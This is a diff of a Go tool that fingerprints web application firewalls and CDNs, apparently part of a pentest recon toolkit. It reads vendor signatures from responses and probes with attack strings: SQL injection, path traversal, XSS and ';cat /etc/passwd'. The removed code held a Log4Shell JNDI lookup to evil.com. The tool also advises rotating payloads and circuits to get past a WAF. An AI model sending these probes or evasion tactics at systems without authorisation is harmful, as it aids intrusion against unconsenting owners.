@@ -1,289 +1,434 @@
+// scan-waf-fingerprint — identifica o WAF/CDN de proteção na frente de um alvo
+// por duas vias independentes e de baixo falso-positivo:
+//
+//	(1) passiva: assinatura de vendor em headers/cookies/corpo de QUALQUER
+//	    resposta (cf-ray, x-sucuri-id, incap_ses, "Support ID:", etc);
+//	(2) comportamental: uma requisição benigna passa (2xx/3xx) mas um payload
+//	    claramente malicioso é BLOQUEADO (403/406/429/501/503 ou challenge).
+//
+// Um 400 solto NUNCA conta como WAF — é request malformado, não filtragem.
+// Isto é contexto de metodologia (info), não uma vulnerabilidade. Contrato
+// NDJSON do recon-hub no stdout.
 package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
 
-type Finding struct {
-	Type     string `json:"type"`
-	Severity string `json:"severity"`
-	Title    string `json:"title"`
-	Evidence string `json:"evidence"`
-	Triage   string `json:"triage"`
+type payload struct {
+	Target string         `json:"target"`
+	Params map[string]any `json:"params"`
+	JobID  string         `json:"job_id"`
 }
 
-type Event struct {
-	Event   string   `json:"event"`
-	Finding *Finding `json:"finding,omitempty"`
+type ev struct {
+	Type        string         `json:"type"`
+	Level       string         `json:"level,omitempty"`
+	Msg         string         `json:"msg,omitempty"`
+	Kind        string         `json:"kind,omitempty"`
+	Value       string         `json:"value,omitempty"`
+	Severity    string         `json:"severity,omitempty"`
+	FindingType string         `json:"finding_type,omitempty"`
+	Title       string         `json:"title,omitempty"`
+	Asset       string         `json:"asset,omitempty"`
+	Evidence    string         `json:"evidence,omitempty"`
+	Meta        map[string]any `json:"meta,omitempty"`
+	OK          bool           `json:"ok,omitempty"`
 }
 
-type WAFSignature struct {
-	Name       string
-	Headers    map[string]string
-	BodyText   []string
-	StatusCode []int
-}
+var (
+	mu     sync.Mutex
+	out    = bufio.NewWriter(os.Stdout)
+	pretty bool
+	client *http.Client
+	finds  int
+)
 
-var wafSignatures = []WAFSignature{
-	{
-		Name: "Cloudflare",
-		Headers: map[string]string{
-			"server": "cloudflare",
-			"cf-ray": "",
-		},
-		StatusCode: []int{403, 429},
-	},
-	{
-		Name: "AWS WAF",
-		Headers: map[string]string{
-			"x-amzn-waf": "",
-		},
-		StatusCode: []int{403},
-	},
-	{
-		Name:       "ModSecurity",
-		BodyText:   []string{"ModSecurity", "mod_security"},
-		StatusCode: []int{403},
-	},
-	{
-		Name: "F5 BIG-IP ASM",
-		Headers: map[string]string{
-			"server": "BigIP",
-		},
-		BodyText:   []string{"The requested URL was rejected by the Web Application Firewall"},
-		StatusCode: []int{403},
-	},
-	{
-		Name: "Imperva SecureSphere",
-		Headers: map[string]string{
-			"x-iinfo": "",
-		},
-		BodyText:   []string{"Imperva", "Access Denied"},
-		StatusCode: []int{403, 403},
-	},
-	{
-		Name:       "Barracuda WAF",
-		BodyText:   []string{"Barracuda", "Access Control"},
-		StatusCode: []int{403},
-	},
-	{
-		Name: "nginx",
-		Headers: map[string]string{
-			"server": "nginx",
-		},
-		StatusCode: []int{403},
-	},
-	{
-		Name:       "Sucuri WAF",
-		BodyText:   []string{"Sucuri", "block-page"},
-		StatusCode: []int{403},
-	},
-}
-
-func emitEvent(event string, finding *Finding) {
-	e := Event{Event: event}
-	if finding != nil {
-		e.Finding = finding
+func emit(e ev) {
+	mu.Lock()
+	defer mu.Unlock()
+	if e.Type == "finding" {
+		finds++
 	}
-	data, _ := json.Marshal(e)
-	fmt.Println(string(data))
+	if pretty {
+		switch e.Type {
+		case "finding":
+			fmt.Fprintf(out, "[%s] %s\n        %s\n", strings.ToUpper(e.Severity), e.Title, e.Evidence)
+		case "done":
+			fmt.Fprintln(out, "done: "+e.Msg)
+		case "error":
+			fmt.Fprintln(out, "erro: "+e.Msg)
+		default:
+			lv := e.Level
+			if lv == "" {
+				lv = "info"
+			}
+			fmt.Fprintf(out, "[%s] %s\n", lv, e.Msg)
+		}
+	} else {
+		b, _ := json.Marshal(e)
+		out.Write(b)
+		out.WriteByte('\n')
+	}
+	out.Flush()
 }
 
-func testWAF(baseURL string, timeout time.Duration, payloads []string) *Finding {
-	_, err := url.Parse(baseURL)
+// signature is one WAF/CDN vendor and the low-FP substrings that identify it.
+// Each needle is matched (lowercased) against the union of response headers,
+// set-cookie values and a body snippet.
+type signature struct {
+	vendor  string
+	needles []string
+}
+
+var signatures = []signature{
+	{"Cloudflare", []string{"cf-ray", "server: cloudflare", "__cfduid", "cf_clearance", "cf-mitigated", "attention required! | cloudflare", "cloudflare to restrict access"}},
+	{"Akamai", []string{"x-akamai-transformed", "akamaighost", "ak_bmsc=", "_abck=", "akamai reference"}},
+	{"AWS CloudFront/WAF", []string{"x-amzn-waf-", "x-amz-cf-id", "x-amzn-requestid", "x-amz-apigw-id", "awselb="}},
+	{"Imperva Incapsula", []string{"x-iinfo", "incap_ses_", "visid_incap_", "_incapsula_resource", "incapsula incident id"}},
+	{"Sucuri", []string{"x-sucuri-id", "x-sucuri-cache", "sucuri website firewall", "access denied - sucuri"}},
+	{"F5 BIG-IP ASM", []string{"the requested url was rejected", "support id:", "x-waf-event", "bigipserver"}},
+	{"ModSecurity", []string{"mod_security", "modsecurity", "this error was generated by mod_security"}},
+	{"Barracuda", []string{"barra_counter_session", "barracuda"}},
+	{"Wordfence", []string{"generated by wordfence", "your access to this site has been limited"}},
+	{"FortiWeb", []string{"fortigate", "powered by fortinet", ".fgd_icon"}},
+	{"Wallarm", []string{"nginx-wallarm", "wallarm"}},
+	{"DenyAll", []string{"sessioncookie=; expires", "condition intercepted"}},
+	{"Citrix NetScaler", []string{"ns_af=", "citrix_ns_id", "nsc_"}},
+	{"Fastly", []string{"x-served-by: cache-", "fastly-io-info", "server: fastly"}},
+}
+
+// fingerprintSource builds the lowercased haystack from a response.
+func fingerprintSource(resp *http.Response, body string) string {
+	var sb strings.Builder
+	for k, vals := range resp.Header {
+		for _, v := range vals {
+			sb.WriteString(strings.ToLower(k))
+			sb.WriteString(": ")
+			sb.WriteString(strings.ToLower(v))
+			sb.WriteByte('\n')
+		}
+	}
+	for _, c := range resp.Cookies() {
+		sb.WriteString("set-cookie: ")
+		sb.WriteString(strings.ToLower(c.Name))
+		sb.WriteByte('=')
+		sb.WriteString(strings.ToLower(c.Value))
+		sb.WriteByte('\n')
+	}
+	sb.WriteString(strings.ToLower(body))
+	return sb.String()
+}
+
+// matchVendor returns the first vendor whose any needle appears in src.
+func matchVendor(src string) (string, string) {
+	for _, sig := range signatures {
+		for _, n := range sig.needles {
+			if strings.Contains(src, n) {
+				return sig.vendor, n
+			}
+		}
+	}
+	return "", ""
+}
+
+type probe struct {
+	status int
+	src    string // fingerprint haystack
+}
+
+func do(method, u string) (*probe, error) {
+	req, err := http.NewRequest(method, u, nil)
 	if err != nil {
-		return nil
+		return nil, err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 recon-hub/scan-waf-fingerprint")
+	req.Header.Set("Accept", "text/html,*/*")
+	applyAuth(req)
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))
+	return &probe{status: resp.StatusCode, src: fingerprintSource(resp, string(body))}, nil
+}
+
+// blocked reports whether a status looks like active WAF mitigation. 400 is
+// deliberately excluded (malformed request, not filtering).
+func blocked(status int) bool {
+	switch status {
+	case 403, 406, 429, 501, 503:
+		return true
+	}
+	return false
+}
+
+var maliciousPayloads = []string{
+	"1' OR '1'='1",
+	"../../../../etc/passwd",
+	"<script>alert(1)</script>",
+	";cat /etc/passwd",
+}
+
+func analyze(target string) {
+	base, err := do(http.MethodGet, target)
+	if err != nil {
+		emit(ev{Type: "log", Level: "warn", Msg: target + ": baseline falhou — " + err.Error()})
+		return
 	}
 
-	client := &http.Client{
-		Timeout: timeout,
+	// Passive fingerprint on the benign response.
+	vendor, needle := matchVendor(base.src)
+
+	// Behavioral probe: only meaningful when the benign request itself was NOT
+	// already blocked.
+	behavioral := false
+	var behStatus int
+	var behPayload string
+	if !blocked(base.status) && base.status >= 200 && base.status < 400 {
+		for _, p := range maliciousPayloads {
+			sep := "?"
+			if strings.Contains(target, "?") {
+				sep = "&"
+			}
+			u := target + sep + "wafprobe=" + url.QueryEscape(p)
+			pr, err := do(http.MethodGet, u)
+			if err != nil {
+				continue
+			}
+			// pick up a vendor signature that only appears on the block page
+			if vendor == "" {
+				if v, n := matchVendor(pr.src); v != "" {
+					vendor, needle = v, n
+				}
+			}
+			if blocked(pr.status) {
+				behavioral = true
+				behStatus = pr.status
+				behPayload = p
+				break
+			}
+		}
+	}
+
+	if vendor == "" && !behavioral {
+		emit(ev{Type: "log", Level: "info", Msg: target + ": nenhum WAF/CDN identificado (baseline HTTP " + strconv.Itoa(base.status) + ")"})
+		return
+	}
+
+	name := vendor
+	if name == "" {
+		name = "WAF/filtragem não identificada"
+	}
+	emit(ev{Type: "asset", Kind: "waf", Value: name, Meta: map[string]any{"target": target}})
+
+	var parts []string
+	if vendor != "" {
+		parts = append(parts, fmt.Sprintf("assinatura de vendor: %q", needle))
+	}
+	if behavioral {
+		parts = append(parts, fmt.Sprintf("bloqueio comportamental: baseline HTTP %d, payload %q → HTTP %d", base.status, behPayload, behStatus))
+	} else if blocked(base.status) {
+		parts = append(parts, fmt.Sprintf("baseline já bloqueado (HTTP %d) — site filtra antes mesmo do payload", base.status))
+	}
+
+	emit(ev{Type: "finding", Severity: "info", FindingType: "waf-detected",
+		Title:    "WAF/CDN na frente de " + target + ": " + name,
+		Asset:    target,
+		Evidence: "Identificado por " + strings.Join(parts, "; ") + ". Contexto de metodologia: ajuste payloads/encoding e rotação de circuito de acordo com o vendor antes de concluir que um endpoint é seguro — um 403 pode ser o WAF, não a aplicação.",
+		Meta: map[string]any{
+			"vendor": vendor, "behavioral_block": behavioral,
+			"baseline_status": base.status,
+		}})
+}
+
+func main() {
+	var (
+		flagTarget = flag.String("target", "", "URL do alvo")
+		flagURLs   = flag.String("urls", "", "várias URLs por vírgula/linha")
+		flagURLsF  = flag.String("urls-file", "", "arquivo, uma URL por linha")
+		flagTOms   = flag.Int("timeout-ms", 0, "timeout req (0 = param/8000)")
+		flagConc   = flag.Int("concurrency", 0, "alvos simultâneos (0 = param/5)")
+		flagPretty = flag.Bool("pretty", false, "saída legível")
+	)
+	flag.Parse()
+	pretty = *flagPretty
+	defer out.Flush()
+
+	pl := readPayload()
+	timeout := time.Duration(pick(*flagTOms, intParam(pl.Params, "timeout_ms"), 8000)) * time.Millisecond
+	conc := pick(*flagConc, intParam(pl.Params, "concurrency"), 5)
+
+	transport := &http.Transport{
+		TLSClientConfig:   &tls.Config{MinVersion: tls.VersionTLS12},
+		DisableKeepAlives: true,
+		DialContext:       (&net.Dialer{Timeout: timeout}).DialContext,
+	}
+	applyProxy(transport, timeout)
+	client = &http.Client{
+		Timeout:   timeout,
+		Transport: withBlockRotation(transport, func(msg string) { emit(ev{Type: "log", Level: "info", Msg: msg}) }),
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
 	}
 
-	// Test with benign request first
-	req, _ := http.NewRequest("GET", baseURL, nil)
-	req.Header.Set("User-Agent", "Mozilla/5.0")
-	resp, err := client.Do(req)
-	if err != nil || resp == nil {
-		return nil
-	}
-	baselineStatus := resp.StatusCode
-	resp.Body.Close()
-
-	// Test with payloads that trigger WAF
-	for _, payload := range payloads {
-		testURL := baseURL + "?" + payload
-		req, _ := http.NewRequest("GET", testURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("X-Originating-IP", "[127.0.0.1]")
-
-		resp, err := client.Do(req)
-		if err != nil || resp == nil {
-			continue
+	var targets []string
+	seen := map[string]bool{}
+	add := func(s string) {
+		if u := normURL(s); u != "" && !seen[u] {
+			seen[u] = true
+			targets = append(targets, u)
 		}
-
-		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2000))
-		resp.Body.Close()
-		content := string(body)
-
-		// Check if WAF blocked the request
-		if resp.StatusCode != baselineStatus && resp.StatusCode >= 400 {
-			// Fingerprint the WAF
-			for _, sig := range wafSignatures {
-				matched := false
-
-				for header, val := range sig.Headers {
-					headerVal := resp.Header.Get(header)
-					if val == "" && headerVal != "" {
-						matched = true
-						break
-					} else if val != "" && strings.Contains(strings.ToLower(headerVal), strings.ToLower(val)) {
-						matched = true
-						break
-					}
-				}
-
-				if !matched {
-					for _, bodyText := range sig.BodyText {
-						if strings.Contains(strings.ToLower(content), strings.ToLower(bodyText)) {
-							matched = true
-							break
-						}
-					}
-				}
-
-				if matched {
-					return &Finding{
-						Type:     "waf-detected",
-						Severity: "info",
-						Title:    fmt.Sprintf("WAF detectado: %s", sig.Name),
-						Evidence: fmt.Sprintf("Payload %s retornou %d em vez do %d baseline. Headers: %v", payload, resp.StatusCode, baselineStatus, resp.Header),
-						Triage:   "confirmed",
-					}
-				}
-			}
-
-			// Generic WAF detection
-			return &Finding{
-				Type:     "waf-detected",
-				Severity: "info",
-				Title:    "WAF genérico detectado",
-				Evidence: fmt.Sprintf("Payload %s retornou %d em vez do %d baseline — padrão de rate limit ou WAF típico.", payload, resp.StatusCode, baselineStatus),
-				Triage:   "confirmed",
+	}
+	add(firstNonEmpty(pl.Target, *flagTarget, os.Getenv("RECONHUB_TARGET")))
+	for _, s := range splitList(firstNonEmpty(*flagURLs, strParam(pl.Params, "urls"), os.Getenv("RECONHUB_PARAM_URLS"))) {
+		add(s)
+	}
+	if f := firstNonEmpty(*flagURLsF, strParam(pl.Params, "urls_file"), os.Getenv("RECONHUB_PARAM_URLS_FILE")); f != "" {
+		if b, err := os.ReadFile(f); err == nil {
+			for _, s := range splitList(string(b)) {
+				add(s)
 			}
 		}
 	}
 
-	return nil
-}
-
-func analyzeWAF(baseURL string, timeout time.Duration) []Finding {
-	var findings []Finding
-
-	payloads := []string{
-		"id=1' OR '1'='1",
-		"../../../etc/passwd",
-		"<script>alert(1)</script>",
-		"'; DROP TABLE users; --",
-		"${jndi:ldap://evil.com/a}",
-		"../../../../windows/win.ini",
-		"%00test",
+	if len(targets) == 0 {
+		emit(ev{Type: "error", Msg: "informe target (URL) ou params.urls/urls_file"})
+		os.Exit(2)
 	}
 
-	if f := testWAF(baseURL, timeout, payloads); f != nil {
-		findings = append(findings, *f)
-	}
-
-	return findings
-}
-
-func main() {
-	target := os.Getenv("TARGET")
-	urls := os.Getenv("URLS")
-	urlsFile := os.Getenv("URLS_FILE")
-	timeoutMs := os.Getenv("TIMEOUT_MS")
-
-	if timeoutMs == "" {
-		timeoutMs = "3000"
-	}
-
-	var timeoutInt int
-	fmt.Sscanf(timeoutMs, "%d", &timeoutInt)
-	timeout := time.Duration(timeoutInt) * time.Millisecond
-
-	var urlList []string
-
-	if target != "" {
-		urlList = append(urlList, target)
-	} else if urls != "" {
-		scanner := bufio.NewScanner(strings.NewReader(urls))
-		for scanner.Scan() {
-			u := strings.TrimSpace(scanner.Text())
-			if u != "" {
-				urlList = append(urlList, u)
-			}
-		}
-	} else if urlsFile != "" {
-		file, err := os.Open(urlsFile)
-		if err != nil {
-			emitEvent("error", nil)
-			fmt.Fprintf(os.Stderr, "erro ao abrir arquivo: %v\n", err)
-			os.Exit(1)
-		}
-		defer file.Close()
-
-		scanner := bufio.NewScanner(file)
-		for scanner.Scan() {
-			u := strings.TrimSpace(scanner.Text())
-			if u != "" {
-				urlList = append(urlList, u)
-			}
-		}
-	}
-
-	if len(urlList) == 0 {
-		emitEvent("error", nil)
-		fmt.Fprintf(os.Stderr, "nenhuma URL fornecida\n")
-		os.Exit(1)
-	}
-
-	emitEvent("start", nil)
-
+	sem := make(chan struct{}, conc)
 	var wg sync.WaitGroup
-	var mu sync.Mutex
-	sem := make(chan struct{}, 5)
-
-	for _, u := range urlList {
+	for _, t := range targets {
 		wg.Add(1)
-		go func(url string) {
+		go func(t string) {
 			defer wg.Done()
 			sem <- struct{}{}
 			defer func() { <-sem }()
-
-			findings := analyzeWAF(url, timeout)
-			mu.Lock()
-			if len(findings) == 0 {
-				emitEvent("notice", nil)
-			} else {
-				for _, f := range findings {
-					emitEvent("finding", &f)
-				}
-			}
-			mu.Unlock()
-		}(u)
+			analyze(t)
+		}(t)
 	}
-
 	wg.Wait()
-	emitEvent("done", nil)
+	emit(ev{Type: "done", OK: true, Msg: fmt.Sprintf("%d alvo(s), %d WAF(s) identificado(s)", len(targets), finds)})
+}
+
+// --- helpers (mesmo contrato das outras tools) ---
+
+func applyAuth(req *http.Request) {
+	if !sameHostAsTarget(req.URL.Host) {
+		return
+	}
+	if v := os.Getenv("RECONHUB_AUTH_COOKIE"); v != "" {
+		req.Header.Set("Cookie", v)
+	}
+	if v := os.Getenv("RECONHUB_AUTH_BEARER"); v != "" {
+		req.Header.Set("Authorization", "Bearer "+v)
+	}
+	if v := os.Getenv("RECONHUB_AUTH_HEADERS"); v != "" {
+		var extra map[string]string
+		if json.Unmarshal([]byte(v), &extra) == nil {
+			for k, val := range extra {
+				req.Header.Set(k, val)
+			}
+		}
+	}
+}
+
+func sameHostAsTarget(host string) bool {
+	t := strings.TrimSpace(os.Getenv("RECONHUB_TARGET"))
+	if t == "" {
+		return true
+	}
+	th := t
+	if u, err := url.Parse(t); err == nil && u.Host != "" {
+		th = u.Host
+	}
+	strip := func(h string) string {
+		if i := strings.LastIndexByte(h, ':'); i >= 0 {
+			h = h[:i]
+		}
+		return strings.ToLower(h)
+	}
+	return strip(host) == strip(th)
+}
+
+func readPayload() payload {
+	var p payload
+	fi, err := os.Stdin.Stat()
+	if err != nil || (fi.Mode()&os.ModeCharDevice) != 0 {
+		return p
+	}
+	b, _ := io.ReadAll(io.LimitReader(os.Stdin, 4<<20))
+	if s := strings.TrimSpace(string(b)); s != "" {
+		_ = json.Unmarshal([]byte(s), &p)
+	}
+	return p
+}
+
+func normURL(s string) string {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return ""
+	}
+	if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
+		s = "https://" + s
+	}
+	return s
+}
+
+func splitList(s string) []string {
+	return strings.FieldsFunc(s, func(r rune) bool {
+		return r == ',' || r == '\n' || r == '\r' || r == ' ' || r == '\t'
+	})
+}
+
+func firstNonEmpty(vs ...string) string {
+	for _, v := range vs {
+		if t := strings.TrimSpace(v); t != "" {
+			return t
+		}
+	}
+	return ""
+}
+
+func strParam(m map[string]any, k string) string { s, _ := m[k].(string); return s }
+
+func intParam(m map[string]any, k string) int {
+	switch v := m[k].(type) {
+	case float64:
+		return int(v)
+	case int:
+		return v
+	case string:
+		n, _ := strconv.Atoi(v)
+		return n
+	}
+	return 0
+}
+
+func pick(vs ...int) int {
+	for _, v := range vs {
+		if v > 0 {
+			return v
+		}
+	}
+	if len(vs) > 0 {
+		return vs[len(vs)-1]
+	}
+	return 0
 }
